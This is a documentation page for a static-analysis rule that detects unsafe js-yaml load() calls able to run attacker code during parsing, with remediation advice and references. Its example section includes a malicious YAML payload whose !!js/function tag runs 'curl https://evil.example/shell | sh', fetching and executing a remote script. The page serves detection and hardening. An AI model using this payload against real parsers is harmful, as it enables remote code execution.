---
title: "VNX-NODE-023 – Unsafe YAML.load() with untrusted input"
description: "Detects js-yaml YAML.load() calls that omit a safe schema, allowing attacker-controlled YAML to execute arbitrary JavaScript code during parsing."
---

## Overview

This rule detects calls to `yaml.load()` or `YAML.load()` from the `js-yaml` library where no safe schema (`FAILSAFE_SCHEMA`, `JSON_SCHEMA`, or `CORE_SCHEMA`) is specified. In js-yaml versions 3.x and below, the default schema is `DEFAULT_FULL_SCHEMA`, which supports JavaScript-specific YAML types including `!!js/regexp`, `!!js/undefined`, and `!!js/function`. The `!!js/function` type causes js-yaml to call `new Function(body)()` on the value, executing arbitrary JavaScript during the parse operation.

The attack does not require any post-parse processing on the application's part — the code runs the moment `yaml.load()` is called with a crafted document. This means input validation that runs after parsing cannot stop it. In js-yaml 4.x, `load()` no longer accepts `DEFAULT_FULL_SCHEMA` by default, but projects pinned to 3.x remain vulnerable, and the explicit flag `{schema: DEFAULT_FULL_SCHEMA}` reintroduces the risk in any version.

This rule flags calls to `yaml.load()` that lack a safe schema argument so that all YAML parsing paths can be reviewed and hardened.

**Severity:** High | **CWE:** [CWE-502 – Deserialization of Untrusted Data](https://cwe.mitre.org/data/definitions/502.html)

## Why This Matters

Insecure deserialization is consistently listed in the OWASP Top 10 and has been exploited in numerous real-world supply-chain and application attacks. In the case of js-yaml, a single crafted YAML file — whether submitted via an API, read from a user-supplied path, or embedded in a malicious npm package — can execute arbitrary code in the context of the Node.js process.

YAML is widely used for configuration files, CI/CD pipeline definitions, Kubernetes manifests, and API payloads. Any path that reads YAML from an untrusted source — user uploads, webhook bodies, repository contents fetched from external systems — is a potential injection point. In CI/CD contexts, a compromised YAML pipeline file can execute code with the privileges of the runner, potentially exfiltrating secrets or persisting access.

Upgrading to js-yaml 4.x and using `yaml.load()` with an explicit safe schema, or using `yaml.safeLoad()` in 3.x, eliminates the code execution vector entirely.

## What Gets Flagged

```javascript
// FLAGGED: yaml.load() without a safe schema — executes !!js/function tags
const yaml = require('js-yaml');
const config = yaml.load(req.body.configYaml);

// FLAGGED: YAML.load() without schema restriction
const YAML = require('js-yaml');
const doc = YAML.load(fs.readFileSync(userSuppliedPath, 'utf8'));
```

A malicious YAML payload that achieves RCE:

```yaml
exploit: !!js/function >
  function() {
    require('child_process').execSync('curl https://evil.example/shell | sh');
  }()
```

## Remediation

1. **Upgrade to js-yaml 4.x**, where `load()` no longer supports `DEFAULT_FULL_SCHEMA` by default.

2. **Use `yaml.safeLoad()` in js-yaml 3.x** (equivalent to `load()` with `CORE_SCHEMA`).

3. **Explicitly pass a safe schema** when calling `yaml.load()` in any version.

4. **Never load YAML from untrusted sources** without schema restriction, regardless of library version.

```javascript
// SAFE (js-yaml 4.x): load() defaults are safe; no !!js/* types
const yaml = require('js-yaml');
const config = yaml.load(req.body.configYaml); // safe in 4.x

// SAFE (js-yaml 3.x): safeLoad() restricts to CORE_SCHEMA
const config3 = yaml.safeLoad(req.body.configYaml);

// SAFE (any version): explicit schema prevents code execution types
const safeConfig = yaml.load(req.body.configYaml, {
  schema: yaml.FAILSAFE_SCHEMA, // strings only
});
```

## References

- [CWE-502: Deserialization of Untrusted Data](https://cwe.mitre.org/data/definitions/502.html)
- [CAPEC-586: Object Injection](https://capec.mitre.org/data/definitions/586.html)
- [OWASP Deserialization Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html)
- [OWASP Node.js Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Nodejs_Security_Cheat_Sheet.html)
- [js-yaml npm package and changelog](https://www.npmjs.com/package/js-yaml)
- [CVE-2023-25166 – js-yaml prototype pollution](https://nvd.nist.gov/vuln/detail/CVE-2023-25166)
